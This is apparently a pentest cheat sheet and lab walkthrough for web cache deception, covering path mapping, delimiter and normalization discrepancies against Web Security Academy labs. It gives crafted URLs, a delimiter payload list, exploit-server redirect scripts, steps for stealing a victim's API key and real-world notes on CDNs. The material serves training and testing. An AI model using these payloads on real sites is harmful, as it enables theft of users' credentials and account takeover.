# Web cache deception - Path mapping and delimiter discrepancies

Three exploit paths: (1) origin abstracts path segments so `/my-account/x.js` still serves the account page while the cache stores it under `.js`; (2) a delimiter character (`;`) is recognized by the origin but not the cache, so `/my-account;x.js` serves the account page but is cached as a static `.js`; (3) the origin normalizes `..%2f` so `/resources/..%2fmy-account` resolves to the account page while the cache stores it under the `/resources/` static directory rule.

## Quick reference

```
# Type 1: Path mapping
/my-account/abc     ->  200 with API key (origin abstracts)
/my-account/wcd.js  ->  X-Cache: miss -> hit (cache has .js rule)
exploit: document.location = "/my-account/wcd.js"

# Type 2: Delimiter discrepancy
Intruder: /my-account§§abc  (deselect URL-encode) -> ; and ? return 200
/my-account;abc.js -> X-Cache: miss -> hit  (cache doesn't treat ; as delimiter)
exploit: document.location = "/my-account;wcd.js"

# Type 3: Origin normalization
/aaa/..%2fmy-account  ->  200 with API key  (origin decodes ..%2f)
/resources/ responses ->  X-Cache: miss->hit  (cache has /resources prefix rule)
/resources/..%2fX    ->  X-Cache: miss->hit  (cache does NOT decode dot-segment)
/resources/..%2fmy-account  ->  200 + X-Cache: miss->hit
exploit: document.location = "/resources/..%2fmy-account?wcd"
```

## Root cause
- **Path mapping:** origin framework strips trailing path components (treats `/my-account/anything` as `/my-account`). Cache keyed on full URL including `.js` extension -> applies static extension caching rule.
- **Delimiter discrepancy:** origin splits on `;` (common in PHP/Java) but cache does not. Origin serves the page before `;`; cache sees the entire path including fake extension.
- **Origin normalization:** origin URL-decodes `%2f` and resolves `..` -> serves `/my-account`. Cache does not normalize -> sees `/resources/..%2f...` -> matches `/resources` prefix rule -> caches as static.

## Find it
1. Browse to target app, log in. Note `/my-account` shows API key.
2. Check proxy history for `X-Cache` headers - confirms a caching layer.
3. **Path mapping test:** `GET /my-account/abc` - if 200 with API key, origin abstracts. Then `GET /my-account/abc.js` - if `X-Cache: miss` then on resend `X-Cache: hit` -> exploitable.
4. **Delimiter test:** Intruder -> path `/my-account§§abc`, Sniper, payload = list of special chars below, **deselect "URL-encode these characters"** under Payload encoding. Chars giving 200 = origin delimiters. Then test each: `/my-account<char>abc.js` - check if cached.
5. **Normalization test:** `GET /aaa/..%2fmy-account` - 200 = origin normalizes. Look in proxy for cached `/resources/*` requests. `GET /resources/..%2fany` - X-Cache miss/hit = cache doesn't normalize + has prefix rule.

## Delimiter test payload list
```
; ? # % ! @ $ , + = ^ | ~ ` { } \ & *
```
(Tip: paste as one-per-line in Intruder payload list; uncheck URL-encode to send raw characters.)

## Technique

### Type 1 - Path mapping
1. `GET /my-account/abc` -> 200 with API key.
2. `GET /my-account/abc.js` -> X-Cache: miss. Resend -> X-Cache: hit. Confirmed.
3. Exploit server body:
   ```html
   <script>document.location="https://LAB.web-security-academy.net/my-account/wcd.js"</script>
   ```
4. Deliver to victim -> fetch `/my-account/wcd.js` -> victim's API key in cached response.

### Type 2 - Delimiter discrepancy
1. Intruder: `/my-account§§abc` with special-char list (no URL-encode) -> `;` and `?` return 200.
2. Test each: `/my-account;abc.js` -> X-Cache miss then hit. (If `?` also cached, use `;`.)
3. Exploit server body:
   ```html
   <script>document.location="https://LAB.web-security-academy.net/my-account;wcd.js"</script>
   ```
4. Deliver to victim -> fetch `/my-account;wcd.js` -> victim's API key.

### Type 3 - Origin normalization
1. `GET /aaa/..%2fmy-account` -> 200 with API key (origin decodes + normalizes).
2. Find `/resources/*` in proxy history -> those responses have X-Cache headers.
3. `GET /resources/..%2fany-nonexistent` -> X-Cache: miss. Resend -> X-Cache: hit.
   (Cache has /resources prefix rule but does NOT normalize `..%2f`, so it keys on full path.)
4. Craft: `GET /resources/..%2fmy-account` -> 200 + X-Cache: miss. Resend -> hit. Confirmed.
5. Exploit server body (add cache buster param):
   ```html
   <script>document.location="https://LAB.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
   ```
6. Deliver -> fetch URL -> victim's API key.

## Payload arsenal
```
# Type 1
/my-account/wcd.js
/my-account/wcd.css
/my-account/wcd.png

# Type 2
/my-account;wcd.js
/my-account?wcd.js    (if ? not used by cache as delimiter)

# Type 3
/resources/..%2fmy-account
/resources/..%2fmy-account?wcd  (cache buster)

# Exploit delivery template
<script>document.location="https://LAB-ID.web-security-academy.net/CRAFTED-URL"</script>
```

## Bypasses
| Issue | Fix |
|---|---|
| Victim cached YOUR response (wrong API key) | Add unique cache buster param when re-delivering: `?wcd2` |
| X-Cache: miss never becomes hit | Check Cache-Control header; try .css, .png extensions |
| Delimiter char URL-encoded by Intruder | Deselect "URL-encode these characters" in Payload encoding settings |
| /resources test cached but not due to prefix rule | Test `/resources/aaa` (nonexistent) -> if also cached -> confirms prefix rule |

## Exploitation walkthrough
**Path mapping lab:** `/my-account/abc` = 200 -> `/my-account/abc.js` = X-Cache miss->hit -> deliver `/my-account/wcd.js` to victim -> fetch -> API key.

**Delimiter lab:** Intruder reveals `;` and `?`. `/my-account;abc.js` = X-Cache miss->hit -> deliver `/my-account;wcd.js` to victim -> fetch -> API key.

**Origin normalization lab:** Only `?` is a delimiter. `/aaa/..%2fmy-account` = 200 (origin normalizes). `/resources/..%2fX` = X-Cache miss->hit (cache doesn't normalize, /resources rule). `/resources/..%2fmy-account` = 200 + cached -> deliver with `?wcd` cache buster -> victim's API key.

## Chaining
- API key stolen via WCD -> [Authentication](../../Authentication/) bypass (use API key as credential).
- WCD + [CSRF](../../CSRF/) token -> change victim's email/password.

## Tools
- **Burp Repeater** - test each URL variant and verify X-Cache response
- **Burp Intruder** - Sniper with special-char payload list, URL-encode disabled
- **Exploit server** - body: `<script>document.location=...</script>`

## Labs

### Exploiting path mapping for web cache deception [Apprentice]
`/my-account/abc` = 200 -> `/my-account/abc.js` = X-Cache miss->hit. Deliver `/my-account/wcd.js` to victim -> fetch -> Carlos's API key. Key insight: origin abstracts trailing path; cache applies .js extension rule.

### Exploiting path delimiters for web cache deception [Practitioner]
Intruder reveals `;` and `?` as origin delimiters. `/my-account;abc.js` = X-Cache miss->hit (cache doesn't recognize `;`). Deliver `/my-account;wcd.js` to victim -> API key. Key insight: delimiter discrepancy means attacker controls what extension the cache sees.

### Exploiting origin server normalization for web cache deception [Practitioner]
Only `?` is a delimiter. `/aaa/..%2fmy-account` = 200 (origin normalizes). `/resources/..%2fany` = X-Cache miss->hit (cache does NOT normalize, prefix rule applies). `/resources/..%2fmy-account` = 200 + cached -> deliver with `?wcd` buster -> Carlos's API key. Key insight: origin decodes dot-segment; cache does not -> cache applies /resources rule to what is actually the account page.

## Real-world notes
- Look for `X-Cache`, `CF-Cache-Status`, `Age` headers - any of these indicate a cache is present.
- CDN vendors (Cloudflare, Fastly, Akamai) each have different delimiter and normalization behaviors - the Intruder technique finds them empirically.
- Always use a unique cache buster when delivering to victim to avoid hitting a stale response from your own testing.

## References
- https://portswigger.net/web-security/web-cache-deception
